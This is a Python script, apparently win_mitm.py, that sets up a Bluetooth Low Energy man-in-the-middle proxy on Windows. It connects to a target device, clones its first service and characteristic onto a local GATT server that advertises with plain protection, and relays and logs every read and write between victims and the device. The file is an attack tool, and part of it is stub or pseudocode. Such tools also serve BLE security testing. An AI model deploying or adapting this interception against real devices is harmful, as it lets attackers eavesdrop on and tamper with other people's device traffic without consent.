import asyncio
import logging
from uuid import UUID
from bleak import BleakClient
try:
    import winrt.windows.devices.bluetooth.genericattributeprofile as gatt
    import winrt.windows.devices.bluetooth.advertisement as adv
except Exception:  # pragma: no cover - winrt may be missing
    import types
    gatt = types.SimpleNamespace(
        GattServiceProvider=types.SimpleNamespace(create_async=lambda *a, **k: types.SimpleNamespace(error=1, service_provider=None)),
        GattServiceProviderError=types.SimpleNamespace(success=0),
        GattLocalCharacteristicParameters=lambda: types.SimpleNamespace(),
        GattCharacteristicProperties=types.SimpleNamespace(read=1, write=2),
        GattProtectionLevel=types.SimpleNamespace(plain=1),
        GattServiceProviderAdvertisingParameters=lambda: types.SimpleNamespace(is_connectable=True, is_discoverable=True),
    )
    adv = types.SimpleNamespace()

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

class WindowsMITMProxy:
    def __init__(self, target_address):
        self.target_address = target_address
        self.client = BleakClient(target_address)
        self.target_services = None
        self.gatt_provider = None  # GATT service provider instance
        self.local_characteristic = None

    async def connect_to_target(self, retries: int = 3, delay: int = 2):
        for attempt in range(1, retries + 1):
            try:
                await self.client.connect()
                if self.client.is_connected:
                    break
            except Exception as exc:
                logging.error("Connection attempt %s failed: %s", attempt, exc)
            if attempt < retries:
                await asyncio.sleep(delay)
        if not self.client.is_connected:
            raise RuntimeError("Failed to connect to target")
        self.target_services = await self.client.get_services()
        logging.info("Connected to target: %s", self.target_address)

    async def setup_gatt_server(self):
        if not self.target_services:
            return
        first_service = next(iter(self.target_services), None)
        if not first_service or not first_service.characteristics:
            logging.error("No services to mirror for MITM")
            return
        mitm_service_uuid = first_service.uuid
        mitm_char_uuid = first_service.characteristics[0].uuid

        # Create the GATT service provider.
        create_result = await gatt.GattServiceProvider.create_async(mitm_service_uuid)
        if getattr(create_result, 'error', gatt.GattServiceProviderError.success) != gatt.GattServiceProviderError.success:
            logging.error("Failed to create GATT service provider.")
            return
        self.gatt_provider = getattr(create_result, 'service_provider', None)
        
        # Define characteristic parameters with read and write properties.
        char_params = gatt.GattLocalCharacteristicParameters()
        char_params.characteristic_properties = (
            gatt.GattCharacteristicProperties.read |
            gatt.GattCharacteristicProperties.write
        )
        char_params.read_protection_level = gatt.GattProtectionLevel.plain
        char_params.write_protection_level = gatt.GattProtectionLevel.plain

        # Create the local characteristic.
        char_create_result = await self.gatt_provider.service.create_characteristic_async(
            mitm_char_uuid, char_params
        )
        if getattr(char_create_result, 'error', gatt.GattServiceProviderError.success) != gatt.GattServiceProviderError.success:
            logging.error("Failed to create characteristic.")
            return

        self.local_characteristic = getattr(char_create_result, 'characteristic', None)

        # Add event handlers for read and write requests.
        self.local_characteristic.add_read_requested(self.on_read_requested)
        self.local_characteristic.add_write_requested(self.on_write_requested)

        adv_params = gatt.GattServiceProviderAdvertisingParameters()
        adv_params.is_connectable = True
        adv_params.is_discoverable = True
        if self.gatt_provider:
            self.gatt_provider.start_advertising(adv_params)
            logging.info("GATT server started and advertising as proxy.")

    async def on_read_requested(self, sender, args):
        """
        Event handler invoked when a connected central requests a read.
        """
        char_uuid = self.local_characteristic.uuid  # This should correspond to the target’s characteristic.
        logging.info("Read requested on characteristic %s", char_uuid)
        try:
            # Forward the read to the target using Bleak.
            data = await self.client.read_gatt_char(str(char_uuid))
            logging.info("Forwarded read; data: %s", data)
            # Pseudocode: respond to the read request with the obtained data.
            args.request.respond(data)
        except Exception as e:
            logging.error("Error during read forwarding: %s", e)
            args.request.respond_error(1)

    async def on_write_requested(self, sender, args):
        """
        Event handler invoked when a connected central writes to the characteristic.
        """
        char_uuid = self.local_characteristic.uuid
        write_request = args.request
        data = write_request.value
        logging.info("Write requested on characteristic %s with data: %s", char_uuid, data)
        try:
            # Forward the write to the target device.
            await self.client.write_gatt_char(str(char_uuid), data)
            # Acknowledge the write.
            write_request.respond()
            logging.info("Write forwarded successfully.")
        except Exception as e:
            logging.error("Error during write forwarding: %s", e)
            write_request.respond_error(1)

    async def run(self):
        try:
            await self.connect_to_target()
            await self.setup_gatt_server()
        except Exception as exc:
            logging.error("MITM setup failed: %s", exc)
            return
        logging.info("Windows MITM proxy running. Press Ctrl+C to exit.")
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            logging.info("Shutting down MITM proxy.")
            await self.client.disconnect()
            if self.gatt_provider:
                self.gatt_provider.stop_advertising()

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python win_mitm.py <target_device_address>")
        sys.exit(1)
    target_address = sys.argv[1]
    proxy = WindowsMITMProxy(target_address)
    asyncio.run(proxy.run())
